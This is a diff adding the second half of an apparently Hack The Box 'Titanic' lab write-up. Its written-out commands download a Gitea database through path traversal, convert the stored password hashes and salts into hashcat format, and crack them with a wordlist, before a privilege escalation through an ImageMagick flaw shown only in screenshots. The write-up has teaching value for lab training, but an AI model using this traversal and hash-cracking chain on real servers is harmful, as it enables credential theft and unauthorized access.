@@ -59,3 +59,47 @@ so asking the AI he gave me the path for the config file
 
 and like that we got a clie about a database file on the /data/gitea/gitea.db  
 
+![image](https://github.com/user-attachments/assets/7f0b384a-fbe8-4032-9c59-0c64f974b473)
+
+from that information i installed the database 
+Command : <b> wget http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db -O database </b>
+![image](https://github.com/user-attachments/assets/98253aaa-5de7-43c0-a474-41385f8ad7d8)
+
+So i have retrieved the hashed password ,  names ,  salts  using the following commad 
+
+
+source = "https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#"
+
+Command : <b> sqlite3 database  "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes </b> 
+
+![image](https://github.com/user-attachments/assets/fbe6e924-c5db-457e-ba09-44a099693a34)
+
+with that on i have tried to crack those hashes using hashcat 
+Command : <b> hashcat gitea.hashes  --user /usr/share/wordlists/rockyou.txt</b>
+
+![image](https://github.com/user-attachments/assets/d2ed5eb3-ebca-4c6a-bd26-2f57c9d634e0)
+
+and with that i got the password for the developer and now the ssh works 
+![image](https://github.com/user-attachments/assets/279b34fb-01de-47d1-a692-12b40fa864cf)
+
+NOw the mission is to search for priv esc methods and searching through that they were no suid permissions or sudo for the developer  i've tried to see the listening ports but still nothing now i thought about going through the process executed by the developer 
+![image](https://github.com/user-attachments/assets/8a24c2ac-a11b-4976-b158-614a3ccad2f5)
+
+there was an intersting file app.py but there was nothing over there so searching around i found but the /images was writable by the developer 
+Command : <b> find . -writable -user developer  2>/dev/null
+![image](https://github.com/user-attachments/assets/7a8b7984-52bc-4246-b2d8-cfc1bc939d91)
+
+which it does mean that we can run some scripts on that directory so searching around again i found a bash script 
+![image](https://github.com/user-attachments/assets/0dc8ef9f-35ca-4267-8423-b09e66568d32)
+
+it uses our writable directory and the magick command i thought that we may have vuln right here and checking the magick version i found that it was exploitable 
+
+![image](https://github.com/user-attachments/assets/9ec2aa69-a692-4404-9926-354449142201)
+
+![image](https://github.com/user-attachments/assets/d03fb4cd-001a-4b1b-82e3-18db9dc48c64)
+
+So as y'all can remember that we had that writable directory which it leads that we can execute that over there 
+
+![image](https://github.com/user-attachments/assets/7a89b6e8-799f-40d0-ba18-0593677acae2)
+
+and after that you'll get your root flag Congrats 
